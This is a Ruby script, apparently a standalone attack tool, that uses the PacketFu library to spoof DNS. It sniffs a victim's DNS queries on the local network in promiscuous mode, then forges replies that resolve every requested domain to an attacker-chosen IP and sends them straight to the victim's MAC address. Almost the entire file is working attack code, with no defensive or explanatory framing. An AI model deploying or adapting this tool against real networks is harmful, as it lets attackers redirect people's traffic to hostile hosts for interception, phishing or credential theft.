#!/usr/bin/env ruby

# encoding: ASCII-8BIT
require 'packetfu'
require 'rubygems'
require 'thread'

class DNSSpoof
	def initialize(spoof_ip, victim_ip, iface)
		spoof = false
		@spoof_ip = spoof_ip
		@victim_ip = victim_ip
		@iface = iface
		@victim_mac = PacketFu::Utils.arp(victim_ip, :iface => @iface)
		@config = PacketFu::Utils.whoami?(:iface => @iface)
	
		if spoof then
				puts "Starting DNS Spoof..."
				start
		end
	end

	def start
		if @running then
			puts "Spoofer is already running."
			return
		end

		@running = true

		# Sniff packets with our filter.
		puts "Running DNS Spoofing to Spoof'd IP: " + @spoof_ip + "..."
		filter = "udp and port 53 and src " + @victim_ip
		puts "Filter: " + filter
		capture = PacketFu::Capture.new(
			:iface => @iface, 
			:start => true, 
			:promisc => true, 
			:filter => filter, 
			:save => true)
							
		# Find DNS packets
		# puts "Beginning of finding DNS packets"
		capture.stream.each do |pkt|
			# Ensure that we're capable of parsing the packet. 
			# If we can, ensure that we parse it.
			# puts "Inside the foreach loop"
			if PacketFu::UDPPacket.can_parse?(pkt) then
				# puts "Parsing packets..." 
				packet = PacketFu::Packet.parse(pkt)
			
				# puts "Checking if it's a query..."
				dnsQueryPkt = packet.payload[2].unpack('h*')[0].chr + packet.payload[3].unpack('h*')[0].chr
				# dnsQueryPkt = packet.payload[2].to_s + packet.payload[3].to_s
				# puts dnsQueryPkt
				if dnsQueryPkt == '10' then
				
					# Get the domain name into a human-legible format
					domainName = getDomainName(packet.payload[12..-1])
					if domainName == nil then
						puts "Empty domain field. Continuing..."
						next
					end
				
					puts "DNS Request for: " + domainName
					#if domainName == 'reddit.com' then
					#	puts 'brap brap here we go'
						sendResponsePkt(packet, domainName)
					#end
				end
			end
		end
	end

	def sendResponsePkt(packet, domainName)
		
		# Create the UDP packet
		response = PacketFu::UDPPacket.new(:config => @config)
	
		response.udp_src 	= packet.udp_dst
		response.udp_dst 	= packet.udp_src
		response.ip_saddr 	= packet.ip_daddr
		response.ip_daddr 	= @victim_ip
		response.eth_daddr 	= @victim_mac
		response.payload 	= packet.payload[0, 2]
	
		response.payload += "\x81\x80".force_encoding("ASCII-8BIT") + "\x00\x01".force_encoding("ASCII-8BIT") + "\x00\x01".force_encoding("ASCII-8BIT")
		response.payload += "\x00\x00".force_encoding("ASCII-8BIT") + "\x00\x00".force_encoding("ASCII-8BIT")
	
		# Domain name
		domainName.split(".").each do |section|
			response.payload += section.length.chr
			response.payload += section
		end

		# Set more default values
		response.payload += "\x00\x00\x01\x00".force_encoding("ASCII-8BIT") + "\x01\xc0\x0c\x00".force_encoding("ASCII-8BIT")
		response.payload += "\x01\x00\x01\x00".force_encoding("ASCII-8BIT") + "\x00\x00\xc0\x00".force_encoding("ASCII-8BIT") + "\x04".force_encoding("ASCII-8BIT")
	
		# Convert the IP address
		rawIP = @spoof_ip.split('.');
		response.payload += [rawIP[0].to_i, rawIP[1].to_i, rawIP[2].to_i, rawIP[3].to_i].pack("c*")
	
		# Calculate the packet
		response.recalc
	
		# Send the packet out
		response.to_w(@iface)
		# send(response, @iface)
	end

	def getDomainName(rawDomain)
		domainName = ""
		while true
		
			# Get the length of the next section of the domain name
			length = rawDomain[0].unpack('H*')[0].to_i
			if length == 0 then
				# We have all the sections, so send it back
				return domainName = domainName[0, domainName.length-1]
			else
				# Copy the section of the domain name over, kinda like casting :)
				domainName += rawDomain[1, length] + "."
				rawDomain = rawDomain[length + 1..-1]
			end
		end
	end
end
